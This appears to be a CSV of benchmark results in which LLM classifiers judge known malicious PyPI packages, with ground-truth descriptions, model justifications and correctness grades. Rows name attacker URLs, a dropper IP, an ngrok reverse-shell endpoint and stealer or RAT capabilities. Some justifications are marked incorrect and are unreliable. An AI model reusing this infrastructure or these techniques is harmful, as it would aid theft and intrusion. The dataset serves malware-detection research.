Package Name,version,Objective,Details,justification,justification_correctness,objective_capture_correctness,groundtruth,package_size,classification,package_name,classification_id,package_name-2,package_metadata,Location of malicious snippet_groudthruth,suspicious_files_MAMPD,created_at,updated_at,prompt_id,model,dataset_id,experiment_id,Type,Affected Version,Published,Reported,Sample,files match,Injection Component,Obfuscation,Trigger,Conditional,Targeted OS,Source,Comment,Typo Target,Campaign,,
pycolorz,0.0.6,['data exfiltration'],"Downloads WSP4 Stealer via a Discord hook to grab wallets, passwords, etc, and exfiltrate through https://transfer.sh","The package 'pycolorz' contains code in its setup script that downloads and executes code from a remote server ('https://paste.bingner.com/paste/39kv9/raw'). This behavior is indicative of malicious intent, as it allows the execution of arbitrary code fetched from an external source, which poses significant security risks.",Incorrect,Incorrect,malicious,2360,malicious,pycolorz-0.0.6.tar.gz,c181c7b5-b4b4-4a13-9757-d962321a52eb,pycolorz,"{""author_name"": ""Themonkey094"", ""author_email"": ""NA"", ""num_of_files"": 8, ""package_name"": ""pycolorz"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A Python Library"", ""package_version"": ""0.0.6"", ""package_homepage"": ""NA"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""color.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pycolorz-0.0.6_dump.json""}",/setup.py,{setup.py},2025-06-28 11:38:32.214308+00,2025-06-28 11:38:32.214308+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,32b2d2b1-00a1-41b8-8f54-fd1f65f517d9,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.0.7'],2023-03-04T10:54:00,2023-03-06T11:02:00,yes,1,Typosquatting,['hyperion'],install,['operating system'],['windows'],https://pyup.io/posts/pyup-discovers-new-malicious-pypi-packages,,pycolor,56,,
pycolorz,0.0.9,['data exfiltration'],"Downloads WSP4 Stealer via a Discord hook to grab wallets, passwords, etc, and exfiltrate through https://transfer.sh","The package 'pycolorz' contains a function that downloads and executes code from an external URL, specifically from 'https://paste.bingner.com/paste/39kv9/raw'. This is a common behavior in malicious packages, as it can lead to the execution of arbitrary code on the user's machine, posing a significant security risk.",Incorrect,Incorrect,malicious,1642,malicious,pycolorz-0.0.9.tar.gz,56433c57-5466-4ed8-b1b8-ad2892a01881,pycolorz,"{""author_name"": ""Themonkey094"", ""author_email"": ""NA"", ""num_of_files"": 8, ""package_name"": ""pycolorz"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A Python Library"", ""package_version"": ""0.0.9"", ""package_homepage"": ""NA"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""color.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pycolorz-0.0.9_dump.json""}",/setup.py,"{setup.py,color.py,__init__.py}",2025-06-28 11:48:46.487999+00,2025-06-28 11:48:46.487999+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,378f35ff-8834-488c-bbc7-7262e6f06ce3,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.0.7'],2023-03-04T10:54:00,2023-03-06T11:02:00,yes,1,Typosquatting,['hyperion'],install,['operating system'],['windows'],https://pyup.io/posts/pyup-discovers-new-malicious-pypi-packages,,pycolor,56,,
pycolorz,0.0.8,['data exfiltration'],"Downloads WSP4 Stealer via a Discord hook to grab wallets, passwords, etc, and exfiltrate through https://transfer.sh","The package \\'pycolorz\\' contains a suspicious setup script that downloads and executes code from a remote URL (https://paste.bingner.com/paste/39kv9/raw). This behavior is indicative of malicious activity, as it suggests that the package can execute arbitrary code on the user\\'s machine. Additionally, the use of \""exec\"" with the downloaded content poses significant security risks",Correct,Incorrect,malicious,1508,malicious,pycolorz-0.0.8.tar.gz,7ac1fbc7-299a-40ba-99d4-906c82c3046f,pycolorz,"{""model_type"": ""gemini"", ""author_name"": ""Themonkey094"", ""author_email"": ""NA"", ""num_of_files"": 8, ""package_name"": ""pycolorz"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A Python Library"", ""package_version"": ""0.0.8"", ""package_homepage"": ""NA"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package \\'pycolorz\\' contains a suspicious setup script that downloads and executes code from a remote URL (https://paste.bingner.com/paste/39kv9/raw). This behavior is indicative of malicious activity, as it suggests that the package can execute arbitrary code on the user\\'s machine. Additionally, the use of \""exec\"" with the downloaded content poses significant security risks.' suspicious_files=['setup.py']"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""color.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pycolorz-0.0.8_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{['setup.py'},2025-07-01 19:43:55.230517+00,2025-07-01 19:43:55.230517+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,cfc35518-c08d-4c71-8169-2ee7f656a87a,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.0.7'],2023-03-04T10:54:00,2023-03-06T11:02:00,yes,1,Typosquatting,['hyperion'],install,['operating system'],['windows'],https://pyup.io/posts/pyup-discovers-new-malicious-pypi-packages,,pycolor,56,,
pyconau-funtimes,1.0.6,['backdoor'],Opens reverse shell,The package contains a script that establishes a reverse shell connection to an external server (0.tcp.ngrok.io on port 36946). This indicates malicious behavior as it can allow unauthorized access to the system running the script.,Correct,Correct,malicious,777,malicious,pyconau-funtimes-1.0.6.tar.gz,dd233769-21af-4510-a0d4-b643712cb63f,pyconau-funtimes,"{""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 2, ""package_name"": ""pyconau-funtimes"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""*~** FUN! **~*"", ""package_version"": ""1.0.6"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/pyconau-funtimes-1.0.6_dump.json""}",/setup.py,{setup.py},2025-06-28 12:29:49.114519+00,2025-06-28 12:29:49.114519+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,69d56ec1-467e-474c-befe-8cf15224d7e8,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0.6'],2015-11-12T05:23:53,2018-10-13T00:00:00,yes,1,Trojan Horse,,install,['unconditional'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,,,,
pyobfadvance,1.0.0,,,"The package 'pyobfadvance' contains code that performs obfuscation techniques, which are often used to hide malicious behavior. It imports libraries such as 'base64', 'codecs', and 'zlib' to encode and compress data, suggesting an intention to conceal its true functionality. Additionally, the presence of URL patterns associated with obfuscation services indicates that it is designed to obfuscate other code, further pointing to potential misuse.",,,malicious,9579,malicious,pyobfadvance-1.0.0.tar.gz,1a08959b-ca60-42ab-b9b2-ce4d2d79efe6,pyobfadvance,"{""author_name"": ""pyobfadvance"", ""author_email"": ""pyobfadvance@gmail.com"", ""num_of_files"": 9, ""package_name"": ""pyobfadvance"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Python Obfuscator Advance Version"", ""package_version"": ""1.0.0"", ""package_homepage"": ""https://github.com/pyobfadvance/pyobfadvance"", ""num_of_python_files"": 4, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__main__.py"", ""utils.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pyobfadvance-1.0.0_dump.json""}",setup.py,{setup.py},2025-06-28 10:28:31.037024+00,2025-06-28 10:28:31.037024+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,378ee3bd-ef08-400b-afd9-71bfb763cc9f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0.1'],2023-04-12T17:10:00,,yes,1,,,,,,,,,77,,
pyobfadvance,1.0.1,,,"The package 'pyobfadvance' is designed to obfuscate code and includes imports such as 'base64', 'codecs', and 'zlib' for decoding, which is often used in malicious contexts to hide the true nature of the code. Furthermore, it contains elements that suggest its intention is to execute injected code (using 'eval' and obfuscated payloads). The presence of the URL '(https://pyobfuscate.com)*(eval)' indicates that it is aiming to obfuscate and potentially execute arbitrary code, which is typical behavior for malicious packages.",,,malicious,9588,malicious,pyobfadvance-1.0.1.tar.gz,b5ec2670-7917-4882-a774-7649fbce0342,pyobfadvance,"{""author_name"": ""pyobfadvance"", ""author_email"": ""pyobfadvance@gmail.com"", ""num_of_files"": 9, ""package_name"": ""pyobfadvance"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Python Obfuscator Advance Version"", ""package_version"": ""1.0.1"", ""package_homepage"": ""https://github.com/pyobfadvance/pyobfadvance"", ""num_of_python_files"": 4, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__main__.py"", ""utils.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pyobfadvance-1.0.1_dump.json""}",setup.py,"{setup.py,__main__.py,utils.py,__init__.py}",2025-06-28 13:52:12.338639+00,2025-06-28 13:52:12.338639+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,355b568c-c996-45ef-8186-fe61afd58d8f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0.1'],2023-04-12T17:10:00,,yes,1,,,,,,,,,77,,
pyscrapy,0.3.0,['dropper'],Runs Script from http://39.108.192.78:81/shell.elf,The setup.py file includes a method that downloads and executes a file from a remote server (http://39.108.192.78:81/shell.elf) during installation. This behavior is indicative of malicious intent as it implies the introduction of potentially harmful code executed on the user's system.,Correct,Correct,malicious,3092,malicious,pyscrapy-0.3.0.tar.gz,4f1e4fd0-e594-4b0e-a042-51babd011ed9,pyscrapy,"{""author_name"": ""pyscrapy"", ""author_email"": ""Avikalp@example.com"", ""num_of_files"": 10, ""package_name"": ""pyscrapy"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Useful pyscrapy."", ""package_version"": ""0.3.0"", ""package_homepage"": ""http://pypi.python.org/pypi/pyscrapy/"", ""num_of_python_files"": 4, ""package_description"": ""Topic Model User Evaluation"", ""available_python_files"": [""setup.py"", ""test_pyscrapy.py"", ""__init__.py"", ""pyscrapy.py""], ""package_formatted_path"": "".temp/plain/pyscrapy-0.3.0_dump.json""}",setup.py,{setup.py},2025-06-28 12:43:51.936114+00,2025-06-28 12:43:51.936114+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,43241ebf-7a0f-458b-95f8-f4e9c201c96e,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.3.0'],2017-07-06T12:43:39,2021-06-28T21:41:43,yes,1,Typosquatting,,install,['unconditional'],['*nix'],https://blog.csdn.net/mseaspring/article/details/118316254,,scrapy,,,
pystlete,2.9,,Runs encrypted string in setup.py,"The package contains a section that decrypts data using the 'Fernet' encryption method, which indicates potential malicious behavior as it could be used for unauthorized data access or manipulation. This pattern of using encryption without clear justification for its purpose raises red flags regarding the nature of the package.",Correct,,malicious,36821,malicious,pystlete-2.9.tar.gz,5fd4f2b8-e889-489e-b581-5931b13f9e69,pystlete,"{""model_type"": ""gemini"", ""author_name"": ""NA"", ""author_email"": ""<billythegoat356@gmail.com>"", ""num_of_files"": 9, ""package_name"": ""pystlete"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""by billythegoat356, loTus01 and BlueRed"", ""package_version"": ""2.9"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package contains a section that decrypts data using the 'Fernet' encryption method, which indicates potential malicious behavior as it could be used for unauthorized data access or manipulation. This pattern of using encryption without clear justification for its purpose raises red flags regarding the nature of the package.\"" suspicious_files=['setup.py', '__init__.py']"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pystlete-2.9_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",pystlete/setup.py,"{'setup.py', '__init__.py}",2025-07-01 19:18:24.9752+00,2025-07-01 19:18:24.9752+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,3c8e224e-8bb0-41e2-af5c-d6185d17c837,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['2.9'],2024-07-09T11:39:41.122620Z,,yes,1,,['encryption'],['install'],['unconditional],,,,,,,
pytagora,1.2,['dropper'],To be succinct â€“ the malware tries to connect to a private IP address on TCP port 9009  and then execute whatever Python code is read from the socket.,"The `functions.py` file contains an obfuscated `hello()` function which uses `exec` to execute code that has been base64 encoded. This is a common method used in malicious scripts to hide the actual functionality of the code, indicating that it may carry out harmful actions without the user's consent or awareness. The presence of this unusual behavior raises significant red flags about the package's intentions. Additionally, the author email and GitHub page do not lend credibility or transparency to the package.",Incorrect,Correct,malicious,2721,malicious,pytagora-1.2.tar.gz,f3dcc5cd-d2b3-457f-bf75-974b7c48cac7,pytagora,"{""author_name"": ""Tayna"", ""author_email"": ""febanoza@cliptik.net"", ""num_of_files"": 5, ""package_name"": ""pytagora"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Make pytagora theorem easy"", ""package_version"": ""1.2"", ""package_homepage"": ""https://github.com/leonora12345/test"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""functions.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pytagora-1.2_dump.json""}",/pytagora-1.2/pytagora/functions.py,{functions.py},2025-06-28 12:30:20.754043+00,2025-06-28 12:30:20.754043+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,20e72ac1-bd06-49e1-9bce-9b2621554ae1,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.2'],,2021-07-29T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,Executes code from remote tcp connection,,33,,
pytagora2,1.2,['dropper'],To be succinct â€“ the malware tries to connect to a private IP address on TCP port 9009  and then execute whatever Python code is read from the socket.,"The package contains a Python script that decodes and executes base64-encoded code using the 'exec' function, which is a known practice for obfuscating malicious behavior. The use of 'exec' along with base64 encoding is suspicious and indicates potential malicious intent.",Correct,Correct,malicious,2724,malicious,pytagora2-1.2.tar.gz,10876aa9-fa95-43c9-911b-89eca88e0e32,pytagora2,"{""author_name"": ""Tayna"", ""author_email"": ""febanoza@cliptik.net"", ""num_of_files"": 5, ""package_name"": ""pytagora2"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Make pytagora theorem easy"", ""package_version"": ""1.2"", ""package_homepage"": ""https://github.com/leonora12345/test"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""functions.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pytagora2-1.2_dump.json""}",/pytagora2/functions.py,{functions.py},2025-06-28 11:29:01.759994+00,2025-06-28 11:29:01.759994+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,bc55aa44-39af-4e2d-964c-da196a25dd90,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.2'],,2021-07-29T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,Executes code from remote tcp connection,,33,,
python-ftp,2.4,['data exfiltration'],Uploads username & hostname & ip to remote host.,"The package 'python-ftp' includes a 'detect' function that captures sensitive information such as the current username, host information, and IP address, and sends this data to a remote server (http://us.dslab.pw/webhook.php). This behavior is indicative of malicious intent, as it involves the unauthorized transmission of potentially sensitive user information over the internet.",Correct,correct,malicious,2959,malicious,python-ftp-2.4.tar.gz,325532bd-655e-465a-85ed-a02702efd7b5,python-ftp,"{""author_name"": ""exploitcat"", ""author_email"": ""alt.bi-02dz09w@yopmail.com"", ""num_of_files"": 7, ""package_name"": ""python-ftp"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""python-ftp which is a smb client wrapper"", ""package_version"": ""2.4"", ""package_homepage"": ""https://github.com/db/python-ftp"", ""num_of_python_files"": 2, ""package_description"": ""rich operation for ftp"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/python-ftp-2.4_dump.json""}",/setup.py,{setup.py},2025-06-28 11:14:36.777187+00,2025-06-28 11:14:36.777187+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,dda6028f-84f1-4056-a021-762ffe293a4c,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['2.4'],2018-10-30T08:02:37,2018-12-12T17:23:30,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://github.com/rsc-dev/pypi_malware,,python-pyftpdlib,10,,
python-mongo,0.2.0,['data exfiltration'],Uploads username & hostname & ip to remote host.,"The setup.py script contains a function that collects system information including the username, hostname, OS version, and IP address, and sends this data to a remote URL (http://openvc.org/Version.php). This behavior suggests it could be tracking or exfiltrating user data without consent, which is typical of malicious software. Additionally, the use of base64 encoding for the ID string adds to the suspicion as it may be used to obfuscate data being sent over the network. Although the __init__.py script appears more benign with standard MongoDB interaction code, the presence of the potentially harmful behavior in setup.py is significant enough to classify the entire package as malicious.",Correct,correct,malicious,20832,malicious,python-mongo-0.2.0.tar.gz,efb895eb-ef19-4913-b874-a187eaf81e12,python-mongo,"{""model_type"": ""gemini"", ""author_name"": ""Imbolc"", ""author_email"": ""imbolc@imbolc.name"", ""num_of_files"": 11, ""package_name"": ""python-mongo"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Minimalistic pymongo object wrapper"", ""package_version"": ""0.2.0"", ""package_homepage"": ""https://github.com/imbolc/mongo"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The setup.py script contains a function that collects system information including the username, hostname, OS version, and IP address, and sends this data to a remote URL (http://openvc.org/Version.php). This behavior suggests it could be tracking or exfiltrating user data without consent, which is typical of malicious software. Additionally, the use of base64 encoding for the ID string adds to the suspicion as it may be used to obfuscate data being sent over the network. Although the __init__.py script appears more benign with standard MongoDB interaction code, the presence of the potentially harmful behavior in setup.py is significant enough to classify the entire package as malicious.' suspicious_files=['setup.py']"", ""num_of_python_files"": 2, ""package_description"": ""mongo"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/python-mongo-0.2.0_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{'setup.py'},2025-07-01 19:36:43.970257+00,2025-07-01 19:36:43.970257+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,e05e2ea6-9101-4150-93e8-efcc7d7bf51a,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.2.0'],2018-05-10T08:09:23,2018-12-12T17:23:30,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://github.com/rsc-dev/pypi_malware,,python-mongodb,7,,
python-mysqldb,2.4,['data exfiltration'],Uploads username & hostname & ip to remote host.,"""The package is authored by 'exploitcat' and has a suspicious email address. The description as a 'smb client wrapper' combined with the author's name raises concerns about potential malicious intent. No functions were detected in the setup.py, which suggests it might be a placeholder or intent to obscure functionality.",Correct,incorrect,malicious,3048,malicious,python-mysqldb-2.4.tar.gz,e3c31b8a-960d-4f67-9007-0d4acb0bddeb,python-mysqldb,"{""model_type"": ""gemini"", ""author_name"": ""exploitcat"", ""author_email"": ""alt.bi-02dz09w@yopmail.com"", ""num_of_files"": 7, ""package_name"": ""python-mysqldb"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""python-mysqldb which is a smb client wrapper"", ""package_version"": ""2.4"", ""package_homepage"": ""https://github.com/db/python-mysqldb"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package is authored by 'exploitcat' and has a suspicious email address. The description as a 'smb client wrapper' combined with the author's name raises concerns about potential malicious intent. No functions were detected in the setup.py, which suggests it might be a placeholder or intent to obscure functionality.\"" suspicious_files=['setup.py']"", ""num_of_python_files"": 2, ""package_description"": ""rich operation for python-mysqldb"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/python-mysqldb-2.4_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{'setup.py'},2025-07-01 19:27:14.499936+00,2025-07-01 19:27:14.499936+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,5dc3b0cd-5597-40bc-bfa5-ef734157b01b,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['2.4'],2018-10-30T08:06:57,2018-12-12T17:23:30,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://github.com/rsc-dev/pypi_malware,,python-mysqldb,10,,
python-openssl,0.1,['data exfiltration'],Uploads username & hostname & ip to remote host.,"The package 'python-openssl' attempts to send user information, including system and network information, to an external URL (http://openvc.org/Version.php) through the 'checkVersion' function in 'setup.py'. This type of behavior is suspicious and indicative of potential malware. Additionally, it can execute system commands which can be leveraged for harmful activities.",Correct,Correct,malicious,13013,malicious,python-openssl-0.1.tar.gz,0c89c1f8-c846-41d2-8e90-bc194aa1b3a2,python-openssl,"{""author_name"": ""Youssef Seddik"", ""author_email"": ""yseddik94@gmail.com"", ""num_of_files"": 11, ""package_name"": ""python-openssl"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Command line interface to OpenSSL with Python3"", ""package_version"": ""0.1"", ""package_homepage"": ""https://github.com/the11/openssl-python"", ""num_of_python_files"": 3, ""package_description"": ""# openssl-python"", ""available_python_files"": [""setup.py"", ""openssl.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/python-openssl-0.1_dump.json""}",/setup.py,{setup.py},2025-06-28 10:25:45.373684+00,2025-06-28 10:25:45.373684+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,5477e8f5-5eff-4484-82db-4b1b48ab08df,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1'],2018-05-10T13:16:36,2018-12-12T17:23:30,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://github.com/rsc-dev/pypi_malware,,python-openssl,7,,
python-sqlite,2.4,['data exfiltration'],Uploads username & hostname & ip to remote host.,"The package contains a function that sends system information (username and hostname) to a remote server (http://us.dslab.pw/webhook.php), which is a behavior typically associated with malware. The use of the author's name 'exploitcat' also raises suspicion about the intent of the package.",Correct,Correct,malicious,3013,malicious,python-sqlite-2.4.tar.gz,f4a498d6-d75c-4c30-bfa2-86a12194d2ab,python-sqlite,"{""author_name"": ""exploitcat"", ""author_email"": ""alt.bi-02dz09w@yopmail.com"", ""num_of_files"": 7, ""package_name"": ""python-sqlite"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""python-sqlite which is a mysql client wrapper"", ""package_version"": ""2.4"", ""package_homepage"": ""https://github.com/db/python-sqlite"", ""num_of_python_files"": 2, ""package_description"": ""rich operation for mysql"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/python-sqlite-2.4_dump.json""}",/setup.py,"{setup.py,__init__.py}",2025-06-28 11:06:49.6869+00,2025-06-28 11:06:49.6869+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,c5e77020-694b-4836-a53e-4205bc7e4058,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['2.4'],2018-10-29T12:11:14,2018-12-12T17:23:30,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://github.com/rsc-dev/pypi_malware,squats ubuntu package,python-sqlite,10,,
reols,0.1,"['backdoor', 'data exfiltration']",checking whether the victim machine is a virtual machine or a sandbox environment  obtaining keyboard input  taking screenshots  obtaining files on the victim host  stealing Functions such as fetching passwords stored by the browser and executing arbitrary system commands.,"The package contains a Python script that includes functionalities such as keylogging, remote command execution, and unauthorized access to stored credentials, indicating it is designed for malicious purposes (e.g., spyware or a backdoor)",Correct,Correct,malicious,15081,malicious,reols-0.1.tar.gz,c305e137-1ba2-42b1-a1ca-f14701dde7cc,reols,"{""model_type"": ""gemini"", ""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 8, ""package_name"": ""reols"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""UNKNOWN"", ""package_version"": ""0.1"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package contains a Python script that includes functionalities such as keylogging, remote command execution, and unauthorized access to stored credentials, indicating it is designed for malicious purposes (e.g., spyware or a backdoor).' suspicious_files=['setup.py', '__init__.py']"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/reols-0.1_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/reols/__init__.py,"{'setup.py', '__init__.py}",2025-07-01 19:07:47.363075+00,2025-07-01 19:07:47.363075+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,8316f73b-c0e8-4edb-b46e-e5c7fc51bf83,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1'],2019-01-07T06:52:14,2021-06-28T21:41:43,yes,1,Typosquatting,,runtime,['unconditional'],['windows'],https://blog.csdn.net/mseaspring/article/details/118316254,Translated with google translate,roles,37,,
req-tools,0.4,"['backdoor', 'data exfiltration']",checking whether the victim machine is a virtual machine or a sandbox environment  obtaining keyboard input  taking screenshots  obtaining files on the victim host  stealing Functions such as fetching passwords stored by the browser and executing arbitrary system commands.,"The extracted Python script appears to be a sophisticated remote access tool (RAT). It contains functionality to take screenshots, upload and download files, log keystrokes, execute commands remotely, and disable the Windows Task Manager. It connects to a remote server to send user information and potentially carry out malicious actions. Specific methods like `keylogger`, `screenshot`, `command_shell`, and the use of socket connections suggest behavior typical of malware, designed to exploit system vulnerabilities, invade user privacy, and operate without user consent.",Correct,correct,malicious,15161,malicious,req-tools-0.4.tar.gz,197ab839-fef4-41b5-9848-a19e5de24ac2,req-tools,"{""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 9, ""package_name"": ""req-tools"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""UNKNOWN"", ""package_version"": ""0.4"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""req_tools.py""], ""package_formatted_path"": "".temp/plain/req-tools-0.4_dump.json""}",/rq-tools/req_tools.py,{req_tools.py},2025-06-28 10:21:01.109271+00,2025-06-28 10:21:01.109271+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,2a66740c-d43e-4731-9972-5a1d3a135eb8,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.4'],2019-01-07T06:09:28,2021-06-28T21:41:43,yes,1,Typosquatting,,runtime,['unconditional'],['windows'],https://blog.csdn.net/mseaspring/article/details/118316254,Translated with google translate,roles,37,,
